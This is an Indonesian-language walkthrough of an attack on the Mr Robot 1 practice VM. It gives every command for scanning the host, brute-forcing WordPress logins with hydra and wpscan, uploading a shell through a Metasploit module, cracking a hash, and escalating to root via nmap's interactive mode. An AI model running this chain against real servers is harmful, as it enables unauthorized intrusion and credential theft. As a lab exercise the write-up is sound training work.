# Laporan Serangan Server Mr Robot 1

Ini adalah hasil serangan yang telah dilakukan pada server Mr Robot 1 untuk latihan serangan.

## Pencarian IP Address Server

- cek ip pc : `ip a` atau `ifconfig` 
- nmap: `nmap -sP <network_id>/<prefix>`
- uji koneksi, kali linux dan server mr-robot: `ping <ip_server>`

## Scan Port Server dengan NMAP
- nmap : `nmap -sC -sV -A <ip_server>`

**Port** yang terbuka dari server adalah :
- http (80)
- htts (443)

**Port** yang tertutup dari server adalah :
- ssh (22)

## Access HTTP (Port 80) Server

## Scan Link Yang Ada pada Web
gunakan nmap untuk scan link
- nmap : `nmap -script http-enum <ip_server>`
- access robot : `http://<ip_server>/robots.txt`
- download informasi yang ada
	- file disc : `wget http://<ip_server>/fsocity.dic`
	- flag 1: `wget http://<ip_server>/key-1-of-3.txt`


## WP-Login
- access wp-login : `http://<ip_server>/wp-login.php`
- cek banyak kata pada disc : `wc fsocity.dic`
- maka muncul terdapat **858160** kata dan baris (tiap kata tiap baris)
- karena banyak yang sama, maka cek : `cat fsocity.dic | grep elliot`
- filter terlebih dahulu, biar urut dan membuat kata yang sama menjadi satu saja: 
```
cat fsocity.dic | sort -u > filtered.txt
```
- cek banyak kata pada txt : `wc filtered.txt`
- muncul **11451** kata dan baris (jauh lebih sedikit dari file aslinya)
- cari username
	- hydra
	```
	hydra -L filtered.txt -p hackeranang <ip_server> http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"
	```
	- tunggu (lebih kurang 7 menit)
	- username : `elliot`, `ELLIOT`, `Elliot`
- cari password
	- wpscan
	```
	wpscan --url http://<ip_server>/wp-login.php -U 'Elliot' -P filtered.txt
	```
	- tunggu (lebih kurang 7 menit)
	password : `ER28-0652`


## Exploit Login
untuk masalah exploit kita gunakan tool metasploit
- buka metasploit
```
msfconsole
```
- cari exploit : 
```
search wordpress shell
```
- pilih : **exploit/unix/webapp/wp_admin_shell_upload**
```
use exploit/unix/webapp/wp_admin_shell_upload
```
- setting exploit
	- setting lengkap
	```
	show advanced options
	```
	- username dan password
	```
	set USERNAME Elliot
	```
	```
	set PASSWORD ER28-0652
	```
	- setting ip
	```
	set RHOSTS <ip_server>
	```
	- setting cek wordpress
	```
	set WPCHECK false
	```
- jalankan exploit
```
exploit
```
- dan tunggu hingga `meterpreter` terbuka




## Shell dan Terminal
setelah masuk meterpreter gunakan perintah
- masuk shell : 
```
shell
```
- ubah shell dengan mode terminal
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```
export TERM=xterm
```
- buka password : `cat password.raw-md5`
- hash dengan link : https://crackstation.net/
- masuk user robot : 
	- `su robot`
	- password : `abcdefghijklmnopqrstuvwxyz`
	- cek user : `whoami`
- flag 2 : `cat key-2-of-3.txt`
- access user root
	- `nmap --interactive`
	- `!sudo /bin/bash`
	- password : `abcdefghijklmnopqrstuvwxyz`
	- cek user : `!whoami`
	- `!sh`
	- masuk folder root : `cd /root`
	- flag 3 : `cat key-3-of-3.txt`